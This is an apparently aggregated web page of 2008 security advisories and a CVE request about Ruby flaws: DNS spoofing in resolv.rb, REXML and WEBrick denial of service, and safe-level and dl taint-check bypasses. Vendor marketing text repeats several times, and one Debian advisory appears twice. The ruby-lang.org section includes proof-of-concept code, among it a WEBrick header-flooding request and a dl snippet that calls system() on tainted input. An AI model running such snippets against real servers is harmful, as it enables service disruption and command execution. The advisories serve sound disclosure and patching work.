How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

Use CVE-2008-3905, to be filled in soon.

We're treating this as a distinct issue because this is *REALLY* bad
randomness within a particular implementation, besides the inherent
limitation of DNS when source ports are fixed.

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

ruby security update (RHSA-2008-0897)

Original Release Date: October 22, 2008

Last Revised: October 22, 2008

Number: ASA-2008-424

Risk Level: None

Advisory Version: 1.0

Advisory Status: Final

---

## 1. Overview:

Ruby is an interpreted scripting language for quick and easy
object-oriented programming.

The Ruby DNS resolver library, resolv.rb, used predictable transaction IDs
and a fixed source port when sending DNS requests. A remote attacker could
use this flaw to spoof a malicious reply to a DNS query. The Common Vulnerabilities and Exposures project (cve.mitre.org) has assigned the name [CVE-2008-3905](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-3905) to this issue.

Ruby's XML document parsing module (REXML) was prone to a denial of service
attack via XML documents with large XML entity definitions recursion. A
specially-crafted XML file could cause a Ruby application using the REXML
module to use an excessive amount of CPU and memory. The Common Vulnerabilities and Exposures project (cve.mitre.org) has assigned the name [CVE-2008-3790](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-3790) to this issue.

An insufficient "taintness" check flaw was discovered in Ruby's DL module,
which provides direct access to the C language functions. An attacker could
use this flaw to bypass intended safe-level restrictions by calling
external C functions with the arguments from an untrusted tainted inputs.
The Common Vulnerabilities and Exposures project (cve.mitre.org) has assigned the name [CVE-2008-3657](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-3657) to this issue.

A denial of service flaw was discovered in WEBrick, Ruby's HTTP server
toolkit. A remote attacker could send a specially-crafted HTTP request to a
WEBrick server that would cause the server to use an excessive amount of
CPU time. The Common Vulnerabilities and Exposures project (cve.mitre.org) has assigned the name [CVE-2008-3656](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-3656) to this issue.

A number of flaws were found in the safe-level restrictions in Ruby. It
was possible for an attacker to create a carefully crafted malicious script
that can allow the bypass of certain safe-level restrictions. The Common Vulnerabilities and Exposures project (cve.mitre.org) has assigned the name [CVE-2008-3655](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-3655) to this issue.

A denial of service flaw was found in Ruby's regular expression engine. If
a Ruby script tried to process a large amount of data via a regular
expression, it could cause Ruby to enter an infinite-loop and crash.
The Common Vulnerabilities and Exposures project (cve.mitre.org) has assigned the name [CVE-2008-3443](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-3443) to this issue.

No Avaya system products using RHEL4 are vulnerable, as ruby is not installed by default.

More information about these vulnerabilities can be found in the security advisory issued by RedHat Linux:

* <https://rhn.redhat.com/errata/RHSA-2008-0897.html>

CVE ID         : CVE-2008-3655 CVE-2008-3656 CVE-2008-3657 CVE-2008-3790 CVE-2008-3905

Several vulnerabilities have been discovered in the interpreter for
the Ruby language, which may lead to denial of service and other
security problems. The Common Vulnerabilities and Exposures project
identifies the following problems:

CVE-2008-3655

    Keita Yamaguchi discovered that several safe level restrictions
    are insufficiently enforced.

CVE-2008-3656

    Christian Neukirchen discovered that the WebRick module uses
    inefficient algorithms for HTTP header splitting, resulting in
    denial of service through resource exhaustion.

CVE-2008-3657

    It was discovered that the dl module doesn't perform taintness
    checks.

CVE-2008-3790

    Luka Treiber and Mitja Kolsek discovered that recursively nested
    XML entities can lead to denial of service through resource
    exhaustion in rexml.

CVE-2008-3905

    Tanaka Akira discovered that the resolv module uses sequential
    transaction IDs and a fixed source port for DNS queries, which
    makes it more vulnerable to DNS spoofing attacks.

For the stable distribution (etch), these problems have been fixed in
version 1.9.0+20060609-1etch3. Packages for arm will be provided later.

For the unstable distribution (sid), these problems have been fixed in
version 1.9.0.2-6.

We recommend that you upgrade your ruby1.9 packages.

the Ruby language, which may lead to denial of service and other
security problems. The Common Vulnerabilities and Exposures project
identifies the following problems:

CVE-2008-3655

    Keita Yamaguchi discovered that several safe level restrictions
    are insufficiently enforced.

CVE-2008-3656

    Christian Neukirchen discovered that the WebRick module uses
    inefficient algorithms for HTTP header splitting, resulting in
    denial of service through resource exhaustion.

CVE-2008-3657

    It was discovered that the dl module doesn't perform taintness
    checks.

CVE-2008-3790

    Luka Treiber and Mitja Kolsek discovered that recursively nested
    XML entities can lead to denial of service through resource
    exhaustion in rexml.

CVE-2008-3905

    Tanaka Akira discovered that the resolv module uses sequential
    transaction IDs and a fixed source port for DNS queries, which
    makes it more vulnerable to DNS spoofing attacks.

For the stable distribution (etch), these problems have been fixed in
version 1.8.5-4etch3. Packages for arm will be provided later.

For the unstable distribution (sid), these problems have been fixed in
version 1.8.7.72-1.

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

Subject: CVE Request (ruby -- DNS spoofing vulnerability in
	resolv.rb)

Hello Steve,

  could you please allocate an another CVE id
for the DNS spoofing vulnerability in Ruby resolv.rb code.

<http://www.ruby-lang.org/en/news/2008/08/08/multiple-vulnerabilities-in-ruby/>
(part DNS spoofing vulnerability in resolv.rb)

Original CVE-2008-1447:

The DNS protocol, as implemented in (1) BIND 8 and 9 before 9.5.0-P1,
9.4.2-P1, and 9.3.5-P1; (2) Microsoft DNS in Windows 2000 SP4, XP SP2
and SP3, and Server 2003 SP1 and SP2; and other implementations allow
remote attackers to spoof DNS traffic via a birthday attack that uses
in-bailiwick referrals to conduct cache poisoning against recursive
resolvers, related to insufficient randomness of DNS transaction IDs and
source ports, aka "DNS Insufficient Socket Entropy Vulnerability" or
"the Kaminsky bug."

The Ruby problem is slightly different from the original CVE-2008-1447
problem. It is also insufficient randomization of transaction IDs and
source ports, but:

1, CVE-2008-1447 speaks nothing about Ruby
2, Part "spoof DNS traffic via a birthday attack that uses in-bailiwick
referrals to conduct cache poisoning against recursive resolvers"
is applicable only to caching resolvers.

The transaction IDs are assigned in sequential (n+1 order) and the
source ports are always the same.

Scenario:
=========

1, First tty:  tcpdump -i eth0 -s1500 -n udp port 53
2, Another tty: ./resolv_test.rb (resolv_test.rb attached).

Thank you in advance

# Multiple vulnerabilities in Ruby

Posted by Shugo Maeda on 8 Aug 2008

Multiple vulnerabilities have been discovered in Ruby. It's recommended
that you upgrade to the latest versions.

## Details

The following vulnerabilities have been discovered.

### Several vulnerabilities in safe level

Several vulnerabilities in safe level have been discovered.

* untrace\_var is permitted at safe level 4.

  ```
  trace_var(:$VAR) {|val| puts "$VAR = #{val}" }

  Thread.new do
   $SAFE = 4
   eval %q{
     proc = untrace_var :$VAR
     proc.first.call("aaa")
   }
  end.join

  ```
* $PROGRAM\_NAME may be modified at safe level 4.

  ```
  Thread.new do
   $SAFE = 4
   eval %q{$PROGRAM_NAME.replace "Hello, World!"}
  end.join

  $PROGRAM_NAME #=> "Hello, World!"

  ```
* Insecure methods may be called at safe level 1-3.

  ```
  class Hello
   def world
     Thread.new do
       $SAFE = 4
       msg = "Hello, World!"
       def msg.size
         self.replace self*10 # replace string
         1 # return wrong size
       end
       msg
     end.value
   end
  end

  $SAFE = 1 # or 2, or 3
  s = Hello.new.world
  if s.kind_of?(String)
   puts s if s.size < 20 # print string which size is less than 20
  end

  ```
* Syslog operations are permitted at safe level 4.

  ```
  require "syslog"

  Syslog.open

  Thread.new do
   $SAFE = 4
   eval %q{
     Syslog.log(Syslog::LOG_WARNING, "Hello, World!")
     Syslog.mask = Syslog::LOG_UPTO(Syslog::LOG_EMERG)
     Syslog.info("masked")
     Syslog.close
   }
  end.join

  ```

These vulnerabilities were reported by Keita Yamaguchi.

### DoS vulnerability in WEBrick

WEBrick::HTTP::DefaultFileHandler is faulty of exponential time taking
requests due to a backtracking regular expression in
WEBrick::HTTPUtils.split\_header\_value.

Exploitable server:

```
require 'webrick'
WEBrick::HTTPServer.new(:Port => 2000, :DocumentRoot => "/etc").start

```

Attack:

```
require 'net/http'
res = Net::HTTP.start("localhost", 2000) { |http|
  req = Net::HTTP::Get.new("/passwd")
  req['If-None-Match'] = %q{meh=""} + %q{foo="bar" } * 100
  http.request(req)
}
p res

```

The request likely won't finish in this universe.

This vulnerability was reported by Christian Neukirchen.

### Lack of taintness check in dl

dl doesn't check taintness, so it could allow attackers to call
dangerous functions.

```
require 'dl'
$SAFE = 1
h = DL.dlopen(nil)
sys = h.sym('system', 'IP')
uname = 'uname -rs'.taint
sys[uname]

```

This vulnerability was reported by sheepman.

### DNS spoofing vulnerability in resolv.rb

resolv.rb allow remote attackers to spoof DNS answers. This risk can be
reduced by randomness of DNS transaction IDs and source ports, so
resolv.rb is fixed to randomize them.

* see also: [CVE-2008-1447](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-1447)

This vulnerability was reported by Tanaka Akira.

## Vulnerable versions

1.8 series

* 1.8.5 and all prior versions
* 1.8.6-p286 and all prior versions
* 1.8.7-p71 and all prior versions

1.9 series

* r18423 and all prior revisions

## Solution

1.8 series
Please upgrade to 1.8.6-p287, or 1.8.7-p72.

* [<URL:https://cache.ruby-lang.org/pub/ruby/1.8/ruby-1.8.6-p287.tar.gz>](https://cache.ruby-lang.org/pub/ruby/1.8/ruby-1.8.6-p287.tar.gz)
* [<URL:https://cache.ruby-lang.org/pub/ruby/1.8/ruby-1.8.7-p72.tar.gz>](https://cache.ruby-lang.org/pub/ruby/1.8/ruby-1.8.7-p72.tar.gz)

1.9 series

Please check out the latest version using Subversion.

```
$ svn co https://svn.ruby-lang.org/repos/ruby/trunk ruby

```

Please note that a package that corrects this weakness may already be
available through your package management software.

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

# Ruby: Multiple vulnerabilities — GLSA **200812-17**

Multiple vulnerabilities have been discovered in Ruby that allow for
attacks including arbitrary code execution and Denial of Service.

### Affected packages

| Package | **dev-lang/ruby** on all architectures |
| --- | --- |
| Affected versions | < **1.8.6\_p287-r1** |
| Unaffected versions | >= **1.8.6\_p287-r1** |

### Background

Ruby is an interpreted object-oriented programming language. The
elaborate standard library includes an HTTP server ("WEBRick") and a
class for XML parsing ("REXML").

### Description

Multiple vulnerabilities have been discovered in the Ruby interpreter
and its standard libraries. Drew Yao of Apple Product Security
discovered the following flaws:

* Arbitrary code execution
  or Denial of Service (memory corruption) in the rb\_str\_buf\_append()
  function (CVE-2008-2662).
* Arbitrary code execution or Denial
  of Service (memory corruption) in the rb\_ary\_stor() function
  (CVE-2008-2663).
* Memory corruption via alloca in the
  rb\_str\_format() function (CVE-2008-2664).
* Memory corruption
  ("REALLOC\_N") in the rb\_ary\_splice() and rb\_ary\_replace() functions
  (CVE-2008-2725).
* Memory corruption ("beg + rlen") in the
  rb\_ary\_splice() and rb\_ary\_replace() functions (CVE-2008-2726).

Furthermore, several other vulnerabilities have been reported:

* Tanaka Akira reported an issue with resolv.rb that enables
  attackers to spoof DNS responses (CVE-2008-1447).
* Akira Tagoh
  of RedHat discovered a Denial of Service (crash) issue in the
  rb\_ary\_fill() function in array.c (CVE-2008-2376).
* Several
  safe level bypass vulnerabilities were discovered and reported by Keita
  Yamaguchi (CVE-2008-3655).
* Christian Neukirchen is credited
  for discovering a Denial of Service (CPU consumption) attack in the
  WEBRick HTTP server (CVE-2008-3656).
* A fault in the dl module
  allowed the circumvention of taintness checks which could possibly lead
  to insecure code execution was reported by "sheepman"
  (CVE-2008-3657).
* Tanaka Akira again found a DNS spoofing
  vulnerability caused by the resolv.rb implementation using poor
  randomness (CVE-2008-3905).
* Luka Treiber and Mitja Kolsek
  (ACROS Security) disclosed a Denial of Service (CPU consumption)
  vulnerability in the REXML module when dealing with recursive entity
  expansion (CVE-2008-3790).

### Impact

These vulnerabilities allow remote attackers to execute arbitrary code,
spoof DNS responses, bypass Ruby's built-in security and taintness
checks, and cause a Denial of Service via crash or CPU exhaustion.

### Workaround

There is no known workaround at this time.

### Resolution

All Ruby users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose ">=dev-lang/ruby-1.8.6_p287-r1"
```

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.
